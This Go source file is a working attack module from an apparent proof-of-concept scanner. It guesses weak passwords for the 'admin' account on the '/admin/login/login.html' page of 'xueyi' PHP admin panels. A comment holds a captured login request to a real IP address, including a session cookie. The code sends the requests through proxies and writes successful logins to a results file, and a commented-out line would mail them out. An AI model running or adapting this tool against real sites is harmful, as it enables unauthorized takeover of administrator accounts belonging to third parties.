// main.go
package mm

import (
	"io/ioutil"
	"log"
	"net/http"

	"github.com/helenNo1/xueyi/poc/base"
	"github.com/helenNo1/xueyi/util"

	// "os"
	"strings"
	// "goroutine"
)

// POST /admin/login/login.html HTTP/1.1
// Host: 39.104.87.190:86
// Content-Length: 30
// Accept: */*
// X-Requested-With: XMLHttpRequest
// User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
// Content-Type: application/x-www-form-urlencoded; charset=UTF-8
// Origin: http://39.104.87.190:86
// Referer: http://39.104.87.190:86/admin/login/login.html
// Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
// Cookie: PHPSESSID=ugblao9hd7jhrdk6eotfda5cu7; think_var=zh-cn
// Connection: close

// username=admin&password=123456
type XueyiWeak struct {
	base.Poc
}

func (t *XueyiWeak) Run() {
	log.Println("check xueyi: ", t.Url)
	//log.Printf("check: %s", url)
	url := t.Url + "/admin/login/login.html"
	passList := [9]string{"123456", "12345", "admin", "admin123", "admin888", "111111", "123", "1", "admin1"}
	for i := 0; i < 9; i++ {
		req, err := http.NewRequest("POST", url, strings.NewReader("username=admin&password="+passList[i]))
		if err != nil {
			return
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		//X-Requested-With: XMLHttpRequest
		req.Header.Set("X-Requested-With", "XMLHttpRequest")
		req.Header.Set("User-Agent",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0")
		//s5url := findOkS5()
		//var c *http.Client
		//if s5url == "" {
		//	println("all socks dead")
		//	c = util.Noredirectclient
		//	//os.Exit(0)
		//}else {
		//	c = NewProxyClientNoredirect(s5url)
		//}
		proxyStr := util.ProxyStr
		//if proxyStr == "" {
		//	log.Fatal("no proxy")
		//}
		c := util.GetHttpNoredirectclient(proxyStr, 10)
		resp, err := c.Do(req)
		if err != nil {
			return
		}
		body, err := ioutil.ReadAll(resp.Body)
		defer resp.Body.Close()

		if err != nil {
			return
		}
		body_str := string(body)

		if strings.Contains(body_str, `"type":1`) {
			log.Println(url, "bcxueyi", "admin", passList[i])

			if !util.FileContainsStr(base.PocSuccFile, url+"\txueyi\tadmin\t"+passList[i]) {
				util.Writeline2file(base.PocSuccFile, url+"\txueyi\tadmin\t"+passList[i])
			}
			//mail_client.SendMailxy("xueyi-success",  url + "\tadmin\t" + passList[i])
			return
		}
	}
	//}
}
